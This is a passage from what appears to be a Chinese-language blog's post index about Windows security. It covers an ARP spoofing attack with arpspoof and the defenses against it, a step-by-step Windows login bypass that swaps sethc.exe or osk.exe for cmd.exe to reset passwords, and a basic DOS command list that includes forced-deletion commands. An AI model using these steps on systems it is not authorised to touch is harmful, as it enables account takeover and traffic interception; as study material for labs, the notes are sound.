src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230707190924266-1695651084164-1695910402144.png" alt="image-20230707190924266"></p><h3 id="5-一直使网络保持通信状态"><a href="#5-一直使网络保持通信状态" class="headerlink" title="5.一直使网络保持通信状态"></a>5.一直使网络保持通信状态</h3><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230707191029327-1695651084164-1695910399941.png" alt="image-20230707191029327"></p><h3 id="6-使用kali发起攻击"><a href="#6-使用kali发起攻击" class="headerlink" title="6.使用kali发起攻击"></a>6.使用kali发起攻击</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.192.128 -r 192.168.192.2</span><br><span class="line">    -i:网卡   -r：网关</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230707191350131-1695651084164-1695910397611.png" alt="image-20230707191350131"></p><h1 id="二、防御措施"><a href="#二、防御措施" class="headerlink" title="二、防御措施"></a>二、防御措施</h1><p>(1)客户端静态绑定网关的真实MAC地址，一般的命令格式是：</p><p>  Arp -s 网关IP地址  网关MAC地址</p><p>(2)在交换机和路由器上设置端口与MAC地址的静态绑定。</p><p>(3)定期检测自身的ARP缓存，检测是否有MAC地址相同的不同表项，即可发现异常。</p><p>(4)使用防火墙持续监控ARP缓存，检测异常变化。</p><h3 id="1-静态绑定"><a href="#1-静态绑定" class="headerlink" title="1.静态绑定"></a>1.静态绑定</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.查看网关地址和MAC地址 arp -a</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230710110747393-1695651084164-1695910395241.png" alt="image-20230710110747393"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.查看本地网络的IDX  netsh  i i show in</span><br><span class="line">             netsh interface ipv4 show interface</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230710110929112-1695651084165-1695910392749.png" alt="image-20230710110929112"></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230710111046195-1695651084165-1695910391396.png" alt="image-20230710111046195"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3.静态绑定  netsh -c &quot;i i&quot; add ne 14 10.9.136.1 50-6f-77-89-ad-92  </span><br><span class="line">注意：需要以管理员运行</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230710111236421-1695651084165-1695910389283.png" alt="image-20230710111236421"></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230710111613637-1695651084165-1695910387539.png" alt="image-20230710111613637"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4.解绑  netsh -c &quot;i i&quot; delete ne 14</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230710111720479-1695651084165-1695910385485.png" alt="image-20230710111720479"></p><h3 id="2-360卫士"><a href="#2-360卫士" class="headerlink" title="2.360卫士"></a>2.360卫士</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.搜索流量防火墙</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230710111830405-1695651084165-1695910383367.png" alt="image-20230710111830405"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.开启</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230710111945973-1695651084165-1695910375107.png" alt="image-20230710111945973"></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230710112009427-1695910371467.png" alt="image-20230710112009427"></p>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>系统密码破解</title>
      <link href="/2022/06/28/Windows/%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
      <url>/2022/06/28/Windows/%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="server-2008"><a href="#server-2008" class="headerlink" title="server 2008"></a>server 2008</h1><h3 id="1-选择镜像"><a href="#1-选择镜像" class="headerlink" title="1.选择镜像"></a>1.选择镜像</h3><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230704165902602-1695451511110.png" alt="image-20230704165902602"></p><h3 id="2-从电源中选择打开电源时进去固件"><a href="#2-从电源中选择打开电源时进去固件" class="headerlink" title="2.从电源中选择打开电源时进去固件"></a>2.从电源中选择打开电源时进去固件</h3><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230704165938496.png" alt="image-20230704165938496"></p><h3 id="3-进入Boot-选项卡，选择以CD为第一启动项，F10进行保存"><a href="#3-进入Boot-选项卡，选择以CD为第一启动项，F10进行保存" class="headerlink" title="3.进入Boot 选项卡，选择以CD为第一启动项，F10进行保存"></a>3.进入Boot 选项卡，选择以CD为第一启动项，F10进行保存</h3><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230704170100094.png" alt="image-20230704170100094"></p><h3 id="4-进入安装界面"><a href="#4-进入安装界面" class="headerlink" title="4.进入安装界面"></a>4.进入安装界面</h3><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230704170258960.png" alt="image-20230704170258960"></p><h3 id="5-进入下一步，选择修复计算机"><a href="#5-进入下一步，选择修复计算机" class="headerlink" title="5.进入下一步，选择修复计算机"></a>5.进入下一步，选择修复计算机</h3><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230704170337498.png" alt="image-20230704170337498"></p><h3 id="6-继续进行"><a href="#6-继续进行" class="headerlink" title="6.继续进行"></a>6.继续进行</h3><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230704170413081.png" alt="image-20230704170413081"></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230704170428411.png" alt="image-20230704170428411"></p><h3 id="7-点击命令提示符，输入相关的命令"><a href="#7-点击命令提示符，输入相关的命令" class="headerlink" title="7.点击命令提示符，输入相关的命令"></a>7.点击命令提示符，输入相关的命令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（1）查看系统盘diskpart</span><br><span class="line"></span><br><span class="line">（2）list volume 查看系统盘在哪</span><br><span class="line"></span><br><span class="line">（3）退出  exit</span><br><span class="line"></span><br><span class="line">（4）先进入D盘   d:</span><br><span class="line"></span><br><span class="line">（5）进入windows目录   cd  windows</span><br><span class="line"></span><br><span class="line">（6）进入 system32     cd System32</span><br><span class="line"></span><br><span class="line">（7）copy  osk.exe oskbak.exe  备份</span><br><span class="line"></span><br><span class="line">（8）copy cmd.exe osk.exe   替换</span><br><span class="line"></span><br><span class="line">（9）y 确定替换</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230704171644980.png" alt="image-20230704171644980"></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230704171714395.png" alt="image-20230704171714395"></p><h3 id="8-重启系统"><a href="#8-重启系统" class="headerlink" title="8.重启系统"></a>8.重启系统</h3><p>   <img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230704171734394.png" alt="image-20230704171734394"></p><p>住：不要点击 任何一个键</p><h3 id="9-在这个界面选择不使用键盘"><a href="#9-在这个界面选择不使用键盘" class="headerlink" title="9.在这个界面选择不使用键盘"></a>9.在这个界面选择不使用键盘</h3><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230704171925343.png" alt="image-20230704171925343"></p><h3 id="10-修改密码"><a href="#10-修改密码" class="headerlink" title="10.修改密码"></a>10.修改密码</h3><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230704172101306.png" alt="image-20230704172101306"></p><h3 id="11-输入新密码"><a href="#11-输入新密码" class="headerlink" title="11.输入新密码"></a>11.输入新密码</h3><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230704172153615.png" alt="image-20230704172153615"></p><h1 id="windows-7"><a href="#windows-7" class="headerlink" title="windows 7"></a>windows 7</h1><h3 id="1-关机，并开机，在出现windows启动界面时强制关机；再开机，出现“启动修复（推荐）”及选择该项；-如为出现，多尝试几次第2步，如还不行，请换其他方法"><a href="#1-关机，并开机，在出现windows启动界面时强制关机；再开机，出现“启动修复（推荐）”及选择该项；-如为出现，多尝试几次第2步，如还不行，请换其他方法" class="headerlink" title="1.关机，并开机，在出现windows启动界面时强制关机；再开机，出现“启动修复（推荐）”及选择该项； # 如为出现，多尝试几次第2步，如还不行，请换其他方法"></a>1.关机，并开机，在出现windows启动界面时强制关机；再开机，出现“启动修复（推荐）”及选择该项； # 如为出现，多尝试几次第2步，如还不行，请换其他方法</h3><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230704192551494.png" alt="image-20230704192551494"></p><h3 id="2-出现系统还原提示，点击取消，等待几分钟后，会出现问题原因，点击查看详细信息；"><a href="#2-出现系统还原提示，点击取消，等待几分钟后，会出现问题原因，点击查看详细信息；" class="headerlink" title="2.出现系统还原提示，点击取消，等待几分钟后，会出现问题原因，点击查看详细信息；"></a>2.出现系统还原提示，点击取消，等待几分钟后，会出现问题原因，点击查看详细信息；</h3><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230704192620580.png" alt="image-20230704192620580"></p><h3 id="3-打开最后一个链接即一个记事本；记事本中点打开，并选择显示所有文件"><a href="#3-打开最后一个链接即一个记事本；记事本中点打开，并选择显示所有文件" class="headerlink" title="3.打开最后一个链接即一个记事本；记事本中点打开，并选择显示所有文件"></a>3.打开最后一个链接即一个记事本；记事本中点打开，并选择显示所有文件</h3><h3 id="4-找到sethc并改名sethc-bak，再找到cmd，复制一份cmd改名为sethc"><a href="#4-找到sethc并改名sethc-bak，再找到cmd，复制一份cmd改名为sethc" class="headerlink" title="4.找到sethc并改名sethc-bak，再找到cmd，复制一份cmd改名为sethc"></a>4.找到sethc并改名sethc-bak，再找到cmd，复制一份cmd改名为sethc</h3><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230704192941476.png" alt="image-20230704192941476"></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230704193035297.png" alt="image-20230704193035297"></p><h3 id="5-全部关闭，重启；系统启动完毕后，连续按5次shift键，将弹出cmd工具，使用命令net-user-用户名-新密码，将当前用户密码修改掉即可，或者另外建立1个用户，并提升为管理员，注销后，可再删除新建的用户，这样的好处为不修改当前用户的密码即可登录系统。"><a href="#5-全部关闭，重启；系统启动完毕后，连续按5次shift键，将弹出cmd工具，使用命令net-user-用户名-新密码，将当前用户密码修改掉即可，或者另外建立1个用户，并提升为管理员，注销后，可再删除新建的用户，这样的好处为不修改当前用户的密码即可登录系统。" class="headerlink" title="5.全部关闭，重启；系统启动完毕后，连续按5次shift键，将弹出cmd工具，使用命令net user 用户名 新密码，将当前用户密码修改掉即可，或者另外建立1个用户，并提升为管理员，注销后，可再删除新建的用户，这样的好处为不修改当前用户的密码即可登录系统。"></a>5.全部关闭，重启；系统启动完毕后，连续按5次shift键，将弹出cmd工具，使用命令net user 用户名 新密码，将当前用户密码修改掉即可，或者另外建立1个用户，并提升为管理员，注销后，可再删除新建的用户，这样的好处为不修改当前用户的密码即可登录系统。</h3><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230704193206568.png" alt="image-20230704193206568"></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230704193229055.png" alt="image-20230704193229055"></p><h1 id="windows-10"><a href="#windows-10" class="headerlink" title="windows 10"></a>windows 10</h1><h3 id="1-电脑点击机箱上开机按钮，出现Windows图标，按机箱的重启键（此动作重复三次）"><a href="#1-电脑点击机箱上开机按钮，出现Windows图标，按机箱的重启键（此动作重复三次）" class="headerlink" title="1.电脑点击机箱上开机按钮，出现Windows图标，按机箱的重启键（此动作重复三次）"></a>1.电脑点击机箱上开机按钮，出现Windows图标，按机箱的重启键（此动作重复三次）</h3><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230704175607662.png" alt="image-20230704175607662"></p><h3 id="2-直到看到“正在准备自动修复”停止操作，待电脑自动跳转到自动修复界面"><a href="#2-直到看到“正在准备自动修复”停止操作，待电脑自动跳转到自动修复界面" class="headerlink" title="2.直到看到“正在准备自动修复”停止操作，待电脑自动跳转到自动修复界面"></a>2.直到看到“正在准备自动修复”停止操作，待电脑自动跳转到自动修复界面</h3><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230704175736998.png" alt="image-20230704175736998"></p><h3 id="3-在自动修复界面，点击“高级选项–疑难解答–高级选项–命令提示符”调出cmd命令行程序。"><a href="#3-在自动修复界面，点击“高级选项–疑难解答–高级选项–命令提示符”调出cmd命令行程序。" class="headerlink" title="3.在自动修复界面，点击“高级选项–疑难解答–高级选项–命令提示符”调出cmd命令行程序。"></a>3.在自动修复界面，点击“高级选项–疑难解答–高级选项–命令提示符”调出cmd命令行程序。</h3><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230704180009474.png" alt="image-20230704180009474"></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230704180045396.png" alt="image-20230704180045396"></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230704180110547.png" alt="image-20230704180110547"></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230704180131737.png" alt="image-20230704180131737"></p><h3 id="4-我们输入notepad命令调出记事本程序"><a href="#4-我们输入notepad命令调出记事本程序" class="headerlink" title="4.我们输入notepad命令调出记事本程序"></a>4.我们输入notepad命令调出记事本程序</h3><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230704180155760.png" alt="image-20230704180155760"></p><h3 id="5-点击“文件–打开–此电脑–双击系统C盘–文件类型–选择所有文件–Windows–system32”"><a href="#5-点击“文件–打开–此电脑–双击系统C盘–文件类型–选择所有文件–Windows–system32”" class="headerlink" title="5.点击“文件–打开–此电脑–双击系统C盘–文件类型–选择所有文件–Windows–system32”"></a>5.点击“文件–打开–此电脑–双击系统C盘–文件类型–选择所有文件–Windows–system32”</h3><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230704181147488.png" alt="image-20230704181147488"></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230704181212926.png" alt="image-20230704181212926"></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230704181236014.png" alt="image-20230704181236014"></p><h3 id="6-将sethc文件重命名为sethc8"><a href="#6-将sethc文件重命名为sethc8" class="headerlink" title="6.将sethc文件重命名为sethc8"></a>6.将sethc文件重命名为sethc8</h3><h3 id="7-将cmd文件重命名为sethc"><a href="#7-将cmd文件重命名为sethc" class="headerlink" title="7.将cmd文件重命名为sethc"></a>7.将cmd文件重命名为sethc</h3><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230704181557661.png" alt="image-20230704181557661"></p><h3 id="8-关闭记事本和命令提示行程序，点击关闭电脑，并重新开机"><a href="#8-关闭记事本和命令提示行程序，点击关闭电脑，并重新开机" class="headerlink" title="8.关闭记事本和命令提示行程序，点击关闭电脑，并重新开机"></a>8.关闭记事本和命令提示行程序，点击关闭电脑，并重新开机</h3><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230704181629640.png" alt="image-20230704181629640"></p><h3 id="9-开机界面连续按5次shift键调出cmd命令行程序"><a href="#9-开机界面连续按5次shift键调出cmd命令行程序" class="headerlink" title="9.开机界面连续按5次shift键调出cmd命令行程序"></a>9.开机界面连续按5次shift键调出cmd命令行程序</h3><h3 id="10-给开机画面上的用户设置新的密码net-user-Admin-123"><a href="#10-给开机画面上的用户设置新的密码net-user-Admin-123" class="headerlink" title="10.给开机画面上的用户设置新的密码net user Admin 123"></a>10.给开机画面上的用户设置新的密码net user Admin 123</h3><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230704191924192.png" alt="image-20230704191924192"></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230704192005167.png" alt="image-20230704192005167"></p>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DOC命令</title>
      <link href="/2022/06/20/Windows/DOC%E5%91%BD%E4%BB%A4/"/>
      <url>/2022/06/20/Windows/DOC%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h3 id="1-DOS窗口，打开方式：win-R，输入Cmd"><a href="#1-DOS窗口，打开方式：win-R，输入Cmd" class="headerlink" title="1.DOS窗口，打开方式：win+R，输入Cmd"></a>1.DOS窗口，打开方式：win+R，输入Cmd</h3><p><img src="https://img-blog.csdnimg.cn/04f6f4bbdde3462f9459a5ecec710bf1.png" alt="在这里插入图片描述"></p><h3 id="2-命令"><a href="#2-命令" class="headerlink" title="2.命令"></a>2.命令</h3><h5 id="（1）修改背景和字体颜色"><a href="#（1）修改背景和字体颜色" class="headerlink" title="（1）修改背景和字体颜色"></a>（1）修改背景和字体颜色</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">color f0  f：代表背景颜色</span><br><span class="line">  0：代表字体颜色</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/25793136abfa4786b36fdbf5021e5817.png" alt="在这里插入图片描述"></p><h5 id="（2）清屏命令"><a href="#（2）清屏命令" class="headerlink" title="（2）清屏命令"></a>（2）清屏命令</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cls</span><br></pre></td></tr></table></figure><h5 id="（3）查看目录文件"><a href="#（3）查看目录文件" class="headerlink" title="（3）查看目录文件"></a>（3）查看目录文件</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir 查看所有的目录文件</span><br><span class="line">文件之前有dir 为目录文件，不存在idr为文本文件</span><br></pre></td></tr></table></figure><h5 id="（4）查看隐藏文件"><a href="#（4）查看隐藏文件" class="headerlink" title="（4）查看隐藏文件"></a>（4）查看隐藏文件</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir /a</span><br></pre></td></tr></table></figure><h5 id="（5）只查看目录"><a href="#（5）只查看目录" class="headerlink" title="（5）只查看目录"></a>（5）只查看目录</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir /a:d    d:只查看目录</span><br><span class="line">r:只读文件</span><br><span class="line">a:准备存档的文件</span><br><span class="line">s:系统文件</span><br></pre></td></tr></table></figure><h5 id="（6）显示文件内容大小中显示千位数分隔符"><a href="#（6）显示文件内容大小中显示千位数分隔符" class="headerlink" title="（6）显示文件内容大小中显示千位数分隔符"></a>（6）显示文件内容大小中显示千位数分隔符</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir /c</span><br></pre></td></tr></table></figure><h5 id="（7）只显示文件名和扩展名"><a href="#（7）只显示文件名和扩展名" class="headerlink" title="（7）只显示文件名和扩展名"></a>（7）只显示文件名和扩展名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir /b</span><br></pre></td></tr></table></figure><h5 id="（8）对文件排序-以名词字母"><a href="#（8）对文件排序-以名词字母" class="headerlink" title="（8）对文件排序,以名词字母"></a>（8）对文件排序,以名词字母</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir /o:n</span><br></pre></td></tr></table></figure><h5 id="（9）大小排序，默认从小到大"><a href="#（9）大小排序，默认从小到大" class="headerlink" title="（9）大小排序，默认从小到大"></a>（9）大小排序，默认从小到大</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir /o:s</span><br></pre></td></tr></table></figure><h5 id="（10）其余"><a href="#（10）其余" class="headerlink" title="（10）其余"></a>（10）其余</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir /o:d  时间</span><br><span class="line">/o:g  组目录</span><br><span class="line">/o:e  扩展名</span><br><span class="line">- 反转顺序的前缀</span><br></pre></td></tr></table></figure><h5 id="（11）显示指定目录的所有子目录"><a href="#（11）显示指定目录的所有子目录" class="headerlink" title="（11）显示指定目录的所有子目录"></a>（11）显示指定目录的所有子目录</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir /s 目录名</span><br></pre></td></tr></table></figure><h5 id="（12）显示所有者"><a href="#（12）显示所有者" class="headerlink" title="（12）显示所有者"></a>（12）显示所有者</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir /q</span><br></pre></td></tr></table></figure><h5 id="（13）显示文件的时间"><a href="#（13）显示文件的时间" class="headerlink" title="（13）显示文件的时间"></a>（13）显示文件的时间</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir /t     /t:w  写入时间</span><br></pre></td></tr></table></figure><h5 id="（14）cd命令，进入目录"><a href="#（14）cd命令，进入目录" class="headerlink" title="（14）cd命令，进入目录"></a>（14）cd命令，进入目录</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd ..返回上一级目录</span><br><span class="line">cd/返回根目录</span><br></pre></td></tr></table></figure><h5 id="（15）补全文件名r"><a href="#（15）补全文件名r" class="headerlink" title="（15）补全文件名r"></a>（15）补全文件名r</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在写出前几个字母后，使用Tab键补全</span><br></pre></td></tr></table></figure><h5 id="（16）创建目录命令"><a href="#（16）创建目录命令" class="headerlink" title="（16）创建目录命令"></a>（16）创建目录命令</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">md 目录名</span><br></pre></td></tr></table></figure><h5 id="（17）删除命令"><a href="#（17）删除命令" class="headerlink" title="（17）删除命令"></a>（17）删除命令</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rd 目录名</span><br><span class="line">rd /s /q 目录名  强制删除</span><br></pre></td></tr></table></figure><h5 id="（18）输出命令"><a href="#（18）输出命令" class="headerlink" title="（18）输出命令"></a>（18）输出命令</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo</span><br><span class="line">echo *** &gt;文件 写入文件，覆盖</span><br><span class="line">echo *** &gt;&gt;文件 写入文件，追加</span><br></pre></td></tr></table></figure><h5 id="（19）查看文件内容"><a href="#（19）查看文件内容" class="headerlink" title="（19）查看文件内容"></a>（19）查看文件内容</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type 文件名 </span><br></pre></td></tr></table></figure><h5 id="（20）删除文件"><a href="#（20）删除文件" class="headerlink" title="（20）删除文件"></a>（20）删除文件</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">del 文件名</span><br><span class="line">del *.后缀  删除后缀的所有文件</span><br><span class="line">del *.*    删除不同类型的所有文件</span><br><span class="line">del * /s/q 无提示删除所有文件</span><br></pre></td></tr></table></figure><h5 id="（21）隐藏文件"><a href="#（21）隐藏文件" class="headerlink" title="（21）隐藏文件"></a>（21）隐藏文件</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">attrib +h 文件名</span><br></pre></td></tr></table></figure><h5 id="（22）复制命令"><a href="#（22）复制命令" class="headerlink" title="（22）复制命令"></a>（22）复制命令</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy 文件 c:\  </span><br></pre></td></tr></table></figure><h5 id="（23）剪切、重命名命令"><a href="#（23）剪切、重命名命令" class="headerlink" title="（23）剪切、重命名命令"></a>（23）剪切、重命名命令</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">move 文件 c:\  </span><br></pre></td></tr></table></figure><h5 id="（24）定时关机、重启、取消"><a href="#（24）定时关机、重启、取消" class="headerlink" title="（24）定时关机、重启、取消"></a>（24）定时关机、重启、取消</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shutdown -s -t 10   关机</span><br><span class="line">shutdown -r -t 10   重启</span><br><span class="line">shutdown -a取消</span><br></pre></td></tr></table></figure><h5 id="（25）ip地址查询"><a href="#（25）ip地址查询" class="headerlink" title="（25）ip地址查询"></a>（25）ip地址查询</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipconfig  </span><br><span class="line">ipconfig /all 详细查询</span><br><span class="line">ipconfig /release 释放ip地址</span><br><span class="line">ipconfig /renew 重新获取ip地址</span><br></pre></td></tr></table></figure><h5 id="（26）测试网络状态-，ip：114-114-114-114"><a href="#（26）测试网络状态-，ip：114-114-114-114" class="headerlink" title="（26）测试网络状态 ，ip：114.114.114.114"></a>（26）测试网络状态 ，ip：114.114.114.114</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping 114.114.114.114</span><br><span class="line">ping 114.114.114.114 -t  一直ping下去</span><br><span class="line">ping 114.114.114.114 -n  固定次数</span><br><span class="line">ping -a 114.114.114.114  解析名称</span><br><span class="line"></span><br><span class="line">注：127.0.0.1  环回地址，代表自己电脑本身</span><br><span class="line"></span><br><span class="line">ttl=128  windows</span><br><span class="line">ttl=32   windows 98</span><br><span class="line">ttl=255  unix</span><br><span class="line">ttl=64   linux</span><br></pre></td></tr></table></figure><h5 id="（27）用户的修改"><a href="#（27）用户的修改" class="headerlink" title="（27）用户的修改"></a>（27）用户的修改</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user查看用户</span><br><span class="line">net user 用户名 密码 /add增加用户</span><br><span class="line">net user 用户名 /delete      删除用户</span><br><span class="line">net user 用户名 /homedir</span><br><span class="line">net user 用户名 /passwordchg:no  不允许修改密码</span><br><span class="line">net user 用户名 /passwordreq:yes  用户必须有密码</span><br><span class="line">net localgroup administrator 用户名 /add 用户添加为管理员组</span><br><span class="line">net user 用户名 /active：no     停用账户</span><br><span class="line">net user 用户名 /times：星期，时间    用户在固定时间内运行</span><br><span class="line">net user 用户名 /expires：月，日，年  用户到日期到期           </span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/03388e2cf0ac4554b16c34c1f04f5b05.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/892dea2b37ba44f89ad49f45b7f51950.png" alt="在这里插入图片描述"></p><h5 id="（28）端口"><a href="#（28）端口" class="headerlink" title="（28）端口"></a>（28）端口</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip:1-65535</span><br><span class="line">http:80</span><br><span class="line">https:443</span><br><span class="line">apache:80</span><br><span class="line">nginx:80</span><br><span class="line">远程桌面：3389</span><br><span class="line">netstat -ano 查看端口</span><br><span class="line">        -a   显示所有连接和监听端口</span><br><span class="line">        -b   显示每个端口关联的可执行程序</span><br><span class="line">        -e   显示以太网统计</span><br><span class="line">        -n   以数字的形式显示地址和端口号</span><br><span class="line">        -O   显示拥有与每个进程关联的id</span><br><span class="line">        -r   显示路由表 / route print</span><br></pre></td></tr></table></figure><h5 id="（29）杀进程"><a href="#（29）杀进程" class="headerlink" title="（29）杀进程"></a>（29）杀进程</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist    显示进程</span><br><span class="line">taskkill /pid  进程的pid   杀进程</span><br><span class="line">taskkill /f /pid 强制杀死进程</span><br></pre></td></tr></table></figure><h5 id="（30）查看机器的详细信息"><a href="#（30）查看机器的详细信息" class="headerlink" title="（30）查看机器的详细信息"></a>（30）查看机器的详细信息</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><h5 id="（31）路由追踪"><a href="#（31）路由追踪" class="headerlink" title="（31）路由追踪"></a>（31）路由追踪</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tracert www.baidu.com</span><br></pre></td></tr></table></figure><h5 id="（32）查询端口"><a href="#（32）查询端口" class="headerlink" title="（32）查询端口"></a>（32）查询端口</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">telnet ip 端口  </span><br><span class="line">弊端：明文，会被抓包</span><br></pre></td></tr></table></figure><h5 id="（33）显示arp缓存表，也叫Ip与mac映射表"><a href="#（33）显示arp缓存表，也叫Ip与mac映射表" class="headerlink" title="（33）显示arp缓存表，也叫Ip与mac映射表"></a>（33）显示arp缓存表，也叫Ip与mac映射表</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp -a</span><br></pre></td></tr></table></figure><h5 id=""><a href="#" class="headerlink" title=""></a></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 byte = 8bit</span><br><span class="line">1kb = 1024byte</span><br><span class="line">1mb = 1024kb</span><br><span class="line">1gb = 1024mb</span><br><span class="line">1TB = 1024gb</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>批处理</title>
